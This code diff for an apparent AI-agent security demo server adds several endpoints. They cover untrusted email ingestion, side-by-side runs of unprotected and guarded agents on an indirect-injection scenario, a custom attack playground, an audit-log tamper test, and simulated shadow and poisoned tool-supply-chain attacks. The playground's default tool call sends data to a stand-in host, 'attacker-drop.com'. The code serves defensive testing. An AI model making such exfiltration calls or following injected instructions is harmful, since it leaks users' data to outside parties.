@@ -1,4 +1,4 @@
-import http from 'node:http';
+﻿import http from 'node:http';
 import fs from 'node:fs';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
@@ -11,6 +11,7 @@ import { ToolRegistry } from './tools/toolRegistry.js';
 import { SimulatedAgent } from './agent/simulatedAgent.js';
 import { ScenarioRunner } from './scenarios/scenarioRunner.js';
 import { MCPGateway } from './mcp/mcpGateway.js';
+import { SAMPLE_EMAILS } from './tools/emailSamples.js';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -18,6 +19,7 @@ const __dirname = path.dirname(__filename);
 // 1. Initialize Core Security Infrastructure
 const auditLogger = new AuditLogger();
 const approvalQueue = new ApprovalQueue();
+approvalQueue.clear(); // Ensure queue starts completely empty
 const pep = new PolicyEnforcementPoint({ auditLogger, approvalQueue });
 const toolRegistry = new ToolRegistry({ pep });
 const agent = new SimulatedAgent({ pep, toolRegistry });
@@ -100,13 +102,141 @@ const server = http.createServer(async (req, res) => {
       if (!scenarioId) {
         return sendJson(res, 400, { error: 'Missing required parameter: scenarioId' });
       }
-      const result = await scenarioRunner.runScenario(scenarioId);
+      if (scenarioId !== 'scenario-4-high-impact-approval') {
+        approvalQueue.clear();
+      }
+      const result = await scenarioRunner.runScenario(scenarioId, body.agentRole);
       return sendJson(res, 200, result);
     }
 
     if (method === 'POST' && pathname === '/api/scenarios/run-all') {
       const results = await scenarioRunner.runAllScenarios();
       return sendJson(res, 200, { results });
+    }
+
+    // --- EMAIL INBOX & UNTRUSTED INGESTION ---
+    if (method === 'GET' && pathname === '/api/email/samples') {
+      return sendJson(res, 200, { samples: SAMPLE_EMAILS });
+    }
+
+    if (method === 'POST' && pathname === '/api/email/process') {
+      const body = await parseJsonBody(req);
+      const { sender, subject, body: emailBody, agentRole = 'SupportAgent', mode = 'both' } = body;
+      if (!sender || !subject) {
+        return sendJson(res, 400, { error: 'Missing required email fields (sender, subject)' });
+      }
+
+      let unprotectedResult = null;
+      let protectedResult = null;
+
+      if (mode === 'unprotected' || mode === 'both') {
+        unprotectedResult = await agent.runEmailUnprotected({
+          sender,
+          subject,
+          body: emailBody || '',
+          agentRole
+        });
+      }
+
+      if (mode === 'protected' || mode === 'both') {
+        protectedResult = await agent.runEmail({
+          sender,
+          subject,
+          body: emailBody || '',
+          agentRole
+        });
+      }
+
+      return sendJson(res, 200, {
+        sender,
+        subject,
+        unprotectedResult,
+        protectedResult
+      });
+    }
+
+    // --- BEFORE VS AFTER DUAL COMPARISON ---
+    if (method === 'POST' && pathname === '/api/scenarios/compare') {
+      const body = await parseJsonBody(req);
+      const scenarioId = body.scenarioId || 'scenario-2-indirect-injection';
+      const scenario = scenarioRunner.getScenarios().find(s => s.id === scenarioId) || scenarioRunner.getScenarios()[1];
+
+      // 1. Run Unprotected Agent
+      const unprotectedResult = await agent.runUnprotected({
+        userPrompt: scenario.userPrompt,
+        agentRole: scenario.agentRole,
+        forcedScenarioId: scenario.id
+      });
+
+      // 2. Run Sentinel-Protected Agent
+      const protectedResult = await agent.run({
+        userPrompt: scenario.userPrompt,
+        agentRole: scenario.agentRole,
+        forcedScenarioId: scenario.id
+      });
+
+      return sendJson(res, 200, {
+        scenarioId: scenario.id,
+        title: scenario.title,
+        unprotectedResult,
+        protectedResult
+      });
+    }
+
+    // --- INTERACTIVE PLAYGROUND (CUSTOM ATTACK TESTING) ---
+    if (method === 'POST' && pathname === '/api/playground/test') {
+      const body = await parseJsonBody(req);
+      const { userPrompt, agentRole = 'SupportAgent', customDocumentContent, targetTool, toolArgs } = body;
+
+      pep.resetTaintState();
+
+      // If custom document text provided, register it in PEP
+      let docInspection = null;
+      if (customDocumentContent) {
+        docInspection = pep.registerUntrustedData({
+          sourceId: 'custom-doc-payload',
+          sourceName: 'User-Provided Document',
+          content: customDocumentContent,
+          taintLevel: 'UNTRUSTED_CONTENT'
+        });
+      }
+
+      // Intercept the target tool call
+      const interception = await pep.interceptToolCall({
+        agentId: 'playground-agent',
+        agentRole,
+        userPrompt: userPrompt || 'Custom attack testing',
+        toolName: targetTool || 'send_external_webhook',
+        toolArgs: toolArgs || { url: 'https://attacker-drop.com/data' }
+      });
+
+      return sendJson(res, 200, {
+        docInspection,
+        interception
+      });
+    }
+
+    // --- POLICIES AND RBAC MATRIX ---
+    if (method === 'GET' && pathname === '/api/policies') {
+      return sendJson(res, 200, {
+        policies: pep.policyEngine.policies,
+        roles: ['SupportAgent', 'ResearchAgent', 'FinanceAgent', 'AdminAgent']
+      });
+    }
+
+    // --- TAMPER-EVIDENT DEMO SIMULATOR ---
+    if (method === 'POST' && pathname === '/api/audit-logs/tamper-test') {
+      if (auditLogger.logs.length === 0) {
+        return sendJson(res, 400, { error: 'No audit logs exist yet to tamper. Run a scenario first.' });
+      }
+      const targetIndex = 0;
+      // Tamper with decision text in memory
+      auditLogger.logs[targetIndex].decision = 'ALLOW_TAMPERED';
+      const verification = auditLogger.verifyChainIntegrity();
+      return sendJson(res, 200, {
+        message: 'Malicious modification simulated in audit log entry 0.',
+        verification
+      });
     }
 
     // --- AGENT CUSTOM EXECUTION ---
@@ -190,6 +320,49 @@ const server = http.createServer(async (req, res) => {
         unsubscribeApprovals();
       });
       return;
+    }
+
+    // --- ROLES ---
+    if (method === 'GET' && pathname === '/api/roles') {
+      return sendJson(res, 200, {
+        roles: [
+          { id: 'report-reader', label: 'Report Reader', description: 'Read-only access to approved reports. Cannot send emails, access secrets, or delete files.' },
+          { id: 'support', label: 'Support Agent', description: 'Can read documents and send emails (with approval for high-impact sends).' },
+          { id: 'admin', label: 'Admin', description: 'Full access to all tools including secrets vault and delete operations.' }
+        ]
+      });
+    }
+
+    // --- TOOL SUPPLY CHAIN ---
+    if (method === 'GET' && pathname === '/api/supply-chain/tools') {
+      return sendJson(res, 200, { tools: pep.supplyChain.getAllTools() });
+    }
+
+    if (method === 'POST' && pathname === '/api/supply-chain/simulate-shadow') {
+      const result = pep.supplyChain.simulateShadowAttack();
+      return sendJson(res, 200, { attack: 'shadow', result });
+    }
+
+    if (method === 'POST' && pathname === '/api/supply-chain/simulate-poison') {
+      const result = pep.supplyChain.simulatePoisonAttack();
+      return sendJson(res, 200, { attack: 'poison', result });
+    }
+
+    if (method === 'POST' && pathname.startsWith('/api/supply-chain/approve/')) {
+      const toolName = decodeURIComponent(pathname.replace('/api/supply-chain/approve/', ''));
+      const updated = pep.supplyChain.approveQuarantine(toolName);
+      return sendJson(res, 200, { status: 'APPROVED', tool: updated });
+    }
+
+    if (method === 'POST' && pathname.startsWith('/api/supply-chain/reject/')) {
+      const toolName = decodeURIComponent(pathname.replace('/api/supply-chain/reject/', ''));
+      const reverted = pep.supplyChain.rejectQuarantine(toolName);
+      return sendJson(res, 200, { status: 'REJECTED', tool: reverted });
+    }
+
+    if (method === 'POST' && pathname === '/api/supply-chain/reset') {
+      pep.supplyChain.reset();
+      return sendJson(res, 200, { status: 'RESET' });
     }
 
     // 404 Fallback
